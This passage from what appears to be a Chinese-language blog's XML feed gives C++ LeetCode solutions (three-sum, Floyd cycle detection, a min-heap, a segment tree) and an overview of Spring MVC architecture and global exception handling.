vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">int</span> left = i + <span class="number">1</span>, right = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="type">int</span> sum = nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) ++left; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) --right;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                    <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] == nums[left + <span class="number">1</span>])</span><br><span class="line">                        ++left; </span><br><span class="line">                    <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] == nums[right - <span class="number">1</span>])</span><br><span class="line">                        --right; </span><br><span class="line">                    ++left;</span><br><span class="line">                    --right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题更像是双指针的题，通过双指针把三数之和降维成两数之和，那为什么会放在妙用数据结构里呢？答案是cpp20+可以直接使用<code>unordered_set(vector&lt;int&gt;)</code>。</p></li><li><p>题目六：<a href="https://leetcode.cn/problems/find-the-duplicate-number">寻找重复数</a><br>给定一个包含n+1个整数的数组nums，其数字都在[1, n]范围内(包括1和n)，假设nums只有一个重复的整数，返回这个重复的数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findDuplicate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> fast = <span class="number">0</span>, slow = fast;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            fast = nums[nums[fast]];</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">        &#125; <span class="keyword">while</span> (fast != slow);</span><br><span class="line">        slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">          slow = nums[slow];</span><br><span class="line">            fast = nums[fast];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和数据结构到底有什么关系呢我请问了，使用unordered_map会变得很慢且消耗更多空间，这道题的关键在于将重复数的特殊性(因为值一定小于等于下标)映射为环路问题，从而使用floyd判圈法即可。</p></li><li><p>题目七：<a href="https://leetcode.cn/problems/super-ugly-number">超级丑数</a><br>超级丑数是一个正整数，并满足其所有质因数都出现在质数数组primes中。给你一个整数n和一个整数数组primes，返回第n个超级丑数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">nthSuperUglyNumber</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt;&amp; primes)</span> </span>&#123;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; min_heap;</span><br><span class="line">        min_heap.<span class="built_in">emplace</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span> (n --) &#123;</span><br><span class="line">            <span class="type">int</span> min_num = min_heap.<span class="built_in">top</span>();</span><br><span class="line">            min_heap.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> min_num;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> prime : primes) &#123;</span><br><span class="line">                <span class="keyword">if</span> (prime &lt;= __INT_MAX__ / min_num)</span><br><span class="line">                    min_heap.<span class="built_in">emplace</span>(prime * min_num);</span><br><span class="line">                <span class="keyword">if</span> (min_num % prime == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：有点难想，使用最小堆来完成，主要是要知道何时pop以及怎么插入，注意边界判断以及去重处理(减少重复操作)。</p></li><li><p>题目八：<a href="https://leetcode.cn/problems/advantage-shuffle">优势洗牌</a><br>给定两个长度相等的数组nums1和nums2，nums1相对于nums2的优势可以用满足nums1[i]&gt;nums2[i]的索引i的数目来描述。返回nums1的任意排列，使其相对于nums2的优势最大化。</p><p>解答一：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">advantageCount</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; numTocount;</span><br><span class="line">        set&lt;<span class="type">int</span>&gt; replaceNums;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums1) &#123;</span><br><span class="line">            ++numTocount[num];</span><br><span class="line">            replaceNums.<span class="built_in">emplace</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums<span class="number">2.</span><span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">auto</span> temp = replaceNums.<span class="built_in">lower_bound</span>(nums2[i] + <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> replaceNum = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp != replaceNums.<span class="built_in">end</span>())</span><br><span class="line">                replaceNum = *temp;</span><br><span class="line">            <span class="keyword">else</span> replaceNum = *replaceNums.<span class="built_in">begin</span>();</span><br><span class="line">            nums2[i] = replaceNum;</span><br><span class="line">            numTocount[replaceNum]--;</span><br><span class="line">            <span class="keyword">if</span> (numTocount[replaceNum] == <span class="number">0</span>)</span><br><span class="line">                replaceNums.<span class="built_in">erase</span>(replaceNum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：有点蠢，不建议使用这个方法，仅供利用数据结构的解法参考。</p><p>解答二：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">advantageCount</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums<span class="number">1.</span><span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">nums2ValToIndex</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            nums2ValToIndex[i].first = nums2[i];</span><br><span class="line">            nums2ValToIndex[i].second = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums<span class="number">1.</span><span class="built_in">begin</span>(), nums<span class="number">1.</span><span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(nums2ValToIndex.<span class="built_in">begin</span>(), nums2ValToIndex.<span class="built_in">end</span>(), [](<span class="keyword">auto</span> &amp;a, <span class="keyword">auto</span> &amp;b)</span><br><span class="line">            &#123; <span class="keyword">return</span> a.first &lt; b.first; &#125;);</span><br><span class="line">        <span class="type">int</span> start = <span class="number">0</span>, end = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] &gt; nums2ValToIndex[start].first) &#123;</span><br><span class="line">                nums2ValToIndex[start++].first = nums1[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              nums2ValToIndex[end--].first = nums1[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            nums2[nums2ValToIndex[i].second] = nums2ValToIndex[i].first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：排完序之后变得非常简单，双指针就能轻松写完，且复杂度主要是在排序上，主要是快排是无序的所以需要记录一下值和下标的映射关系。</p></li><li><p>题目九：<a href="https://leetcode.cn/problems/range-sum-query-mutable">区域和检索 - 数组可修改</a><br>设计一个数据结构，使得其能够快速查询给定数组中任意两个位置间所有数字的和以及更新数组中的元素。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumArray</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> _l, <span class="type">int</span> _r) : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">l</span>(_l), <span class="built_in">r</span>(_r) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;TreeNode&gt; tr;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; myNums;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        tr[u] = <span class="built_in">TreeNode</span>(l, r);</span><br><span class="line">        <span class="keyword">if</span> (l == r) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span>, l, mid);</span><br><span class="line">        <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, mid + <span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> x, <span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tr[u].l == x &amp;&amp; tr[u].r == x) &#123;</span><br><span class="line">            tr[u].val += v;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = (tr[u].l + tr[u].r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt;= mid) <span class="built_in">update</span>(u &lt;&lt; <span class="number">1</span>, x, v);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">update</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, x, v);</span><br><span class="line">        tr[u].val = tr[u &lt;&lt; <span class="number">1</span>].val + tr[u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>].val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= tr[u].l &amp;&amp; tr[u].r &lt;= r)</span><br><span class="line">            <span class="keyword">return</span> tr[u].val;</span><br><span class="line">        <span class="type">int</span> mid = (tr[u].l + tr[u].r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid) sum += <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span>, l, r);</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid) sum += <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">NumArray</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        myNums = nums;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        tr.<span class="built_in">assign</span>(<span class="number">4</span> * n, <span class="built_in">TreeNode</span>(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="built_in">build</span>(<span class="number">1</span>, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="built_in">update</span>(<span class="number">1</span>, i, nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">update</span>(<span class="number">1</span>, index, val - myNums[index]);</span><br><span class="line">        myNums[index] = val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">query</span>(<span class="number">1</span>, left, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用<strong>线段树</strong>结构，线段树是区间查询和区间更新的二叉树结构。它能把区间操作从O(n)降到O(log n)，常用于处理区间最值、区间和、区间修改等问题。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC简述</title>
      <link href="/post/917538ac.html"/>
      <url>/post/917538ac.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是MVC"><a href="#一、什么是MVC" class="headerlink" title="一、什么是MVC"></a>一、什么是MVC</h2><p>MVC是模型(Model)、视图(View)、控制器(Controller)的简写，其核心思想是通过将业务逻辑、数据、显示分离来组织代码。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post23/image-20210809181452421.png" alt="MVC架构"></p><p>MVC又是属于java架构模式中的一种，粒度比设计模式(抽象工厂，单例等)更大，用来组织整个应用的分层结构，而设计模式解决的是“类&#x2F;对象之间如何协作”这类微观问题。</p><h2 id="二、Spring-MVC的发展"><a href="#二、Spring-MVC的发展" class="headerlink" title="二、Spring MVC的发展"></a>二、Spring MVC的发展</h2><h3 id="2-1-Model1时代"><a href="#2-1-Model1时代" class="headerlink" title="2.1 Model1时代"></a>2.1 Model1时代</h3><p>在Model1模式下，整个web应用几乎全部用JSP页面组成，只用少量的JavaBean来处理数据库连接、访问等操作。<br>在这个模式下JSP既是控制层(Controller)又是表现层(View)。显然，这种模式存在很多问题。比如控制逻辑和表现逻辑混杂导致代码重用率低；前后端相互依赖导致开发效率低等等。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post23/mvc-mode1.png" alt="mvc-mode1"></p><h3 id="2-2-Model2时代"><a href="#2-2-Model2时代" class="headerlink" title="2.2 Model2时代"></a>2.2 Model2时代</h3><p>早期的JavaWeb MVC开发模式遵循的是“Java Bean(Model) + JSP(View) + Servlet(Controller)”这种开发模式，具体功能如下：</p><ul><li>Model: 系统涉及的数据，也就是dao和bean。</li><li>View: 展示模型中的数据，只是用来展示。</li><li>Controller: 接受用户请求，并将请求发送至Model，最后返回数据给JSP并展示给用</li></ul><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post23/mvc-model2.png" alt="mvc-model2"></p><p>Model2模式下还存在很多问题，Model2的抽象和封装程度还远远不够，使用Model2进行开发时会不可避免地重复造轮子从而大大降低了程序的可维护性和复用性。</p><h3 id="2-3-Spring-MVC时代"><a href="#2-3-Spring-MVC时代" class="headerlink" title="2.3 Spring MVC时代"></a>2.3 Spring MVC时代</h3><p>MVC是一种架构模式，Spring MVC是一款很优秀的MVC框架，它可以帮助我们进行更简洁的Web层的开发，并且它天生与Spring框架集成。Spring MVC模式下我们一般把后端项目分为Service层(处理业务)、Dao层(数据库操作)、Entity层(实体类)、Controller层(控制层，返回数据给前端页面)。</p><h2 id="三、核心组件以及工作原理"><a href="#三、核心组件以及工作原理" class="headerlink" title="三、核心组件以及工作原理"></a>三、核心组件以及工作原理</h2><p>核心组件如下：</p><ul><li><code>DispatcherServlet</code>: <strong>核心的中央处理器</strong>，负责接收请求、分发，并给予客户端响应。</li><li><code>HandlerMapping</code>: <strong>处理器映射器</strong>，根据URL去匹配查找能处理的<code>Handler</code>，并会将请求涉及到的拦截器和<code>Handler</code>一起封装。</li><li><code>HandlerAdapter</code>: <strong>处理器适配器</strong>，根据<code>HandlerMapping</code>找到的<code>Handler</code>，适配执行对应的<code>Handler</code>。</li><li><code>Handler</code>: <strong>请求处理器</strong>，处理实际请求的处理器。</li><li><code>ViewResolver</code>: <strong>视图解析器</strong>，根据<code>Handler</code>返回的逻辑视图&#x2F;视图解析并渲染真正的视图，并传递给<code>DispatcherServlet</code>响应客户端。</li></ul><p>原理如下图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post23/de6d2b213f112297298f3e223bf08f28.png" alt="mvc原理"></p><p><strong>流程说明(重要)：</strong></p><ul><li>客户端(浏览器)发送请求，<code>DispatcherServlet</code>拦截请求。</li><li><code>DispatcherServlet</code>根据请求信息调用<code>HandlerMapping</code>。<code>HandlerMapping</code>根据URL去匹配查找能处理的<code>Handler</code>(也就是我们平常说的<code>Controller</code>控制器)，并会将请求涉及到的拦截器和<code>Handler</code>一起封装。</li><li><code>DispatcherServlet</code>调用<code>HandlerAdapter</code>适配器执行<code>Handler</code>。</li><li><code>Handler</code>完成对用户请求的处理后，会返回一个<code>ModelAndView</code>对象给<code>DispatcherServlet</code>。<code>ModelAndView</code>顾名思义，包含了数据模型及相应的视图的信息。<code>Model</code>是返回的数据对象，<code>View</code>是个逻辑上的<code>View</code>。</li><li><code>ViewResolver</code>会根据逻辑<code>View</code>查找实际的<code>View</code>。</li><li><code>DispatcherServlet</code>把返回的<code>Model</code>传给<code>View</code>(视图渲染)。</li><li>把<code>View</code>返回给请求者(浏览器)。</li></ul><p>上述流程是传统开发模式(JSP，ThymeLeaf)等的工作原理。然而现在主流的开发方式是前后端分离，这种情况下Spring MVC的<code>View</code>概念发生了一些变化。由于<code>View</code>通常由前端框架(Vue，React等)来处理，后端不再负责渲染页面，而是只负责提供数据，因此：</p><ul><li>前后端分离时，后端不再返回具体的视图，而是返回<strong>纯数据</strong>(通常是JSON格式)，由前端负责渲染和展示。</li><li><code>View</code>的部分在前后端分离的场景下往往不需要设置，Spring MVC的控制器只需要返回数据，不再返回<code>ModelAdnView</code>，而是直接返回数据，Spring会自动将其转换为JSON格式(直接使用<code>@RestController</code>注解或者是使用<code>@Controller</code>注解搭配<code>@ResponseBody</code>注解)。相应的，<code>ViewResolver</code>也将不再被使用。</li></ul><h2 id="四、统一异常处理"><a href="#四、统一异常处理" class="headerlink" title="四、统一异常处理"></a>四、统一异常处理</h2><p>使用注解的方式进行统一异常处理，具体会使用到<code>@ControllerAdvice</code>+<code>ExceptionHandler</code>这两个注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(BaseException.class)</span> <span class="comment">// 用户自定义</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; handleAppException(BaseException ex, HttpServletRequest request) &#123;</span><br><span class="line">      <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(value = ResourceNotFoundException.class)</span> <span class="comment">// 404异常</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;ErrorReponse&gt; <span class="title function_">handleResourceNotFoundException</span><span class="params">(ResourceNotFoundException ex, HttpServletRequest request)</span> &#123;</span><br><span class="line">      <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还可以加入其他异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种异常处理方式下，会给所有或者指定的<code>Controller</code>织入异常处理的逻辑(AOP)，当<code>Controller</code>中的方法抛出异常的时候，由被<code>@ExceptionHandler</code>注解修饰的方法进行处理。</p><p><code>ExceptionHandlerMethodResolver</code>中<code>getMappedMethod</code>方法决定了异常具体被哪个被<code> @ExceptionHandler</code>注解修饰的方法处理异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">private</span> Method <span class="title function_">getMappedMethod</span><span class="params">(Class&lt;? extends Throwable&gt; exceptionType)</span> &#123;</span><br><span class="line">    List&lt;Class&lt;? <span class="keyword">extends</span> <span class="title class_">Throwable</span>&gt;&gt; matches = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//找到可以处理的所有异常信息。mappedMethods 中存放了异常和处理异常的方法的对应关系</span></span><br><span class="line">    <span class="keyword">for</span> (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Throwable</span>&gt; mappedException : <span class="built_in">this</span>.mappedMethods.keySet()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (mappedException.isAssignableFrom(exceptionType)) &#123;</span><br><span class="line">        matches.add(mappedException);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不为空说明有方法处理异常</span></span><br><span class="line">    <span class="keyword">if</span> (!matches.isEmpty()) &#123;</span><br><span class="line">      <span class="comment">// 按照匹配程度从小到大排序</span></span><br><span class="line">      matches.sort(<span class="keyword">new</span> <span class="title class_">ExceptionDepthComparator</span>(exceptionType));</span><br><span class="line">      <span class="comment">// 返回处理异常的方法</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.mappedMethods.get(matches.get(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源代码看出：getMappedMethod()会首先找到可以匹配处理异常的所有方法信息(子类异常也能被父类处理器截获)，然后对其进行继承深度(父类优先级比子类低)的升序排序，最后取最具体的那一个匹配的方法(即匹配度最高的那个)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring AOP原理</title>
      <link href="/post/100a44e4.html"/>
      <url>/post/100a44e4.html</url>
      
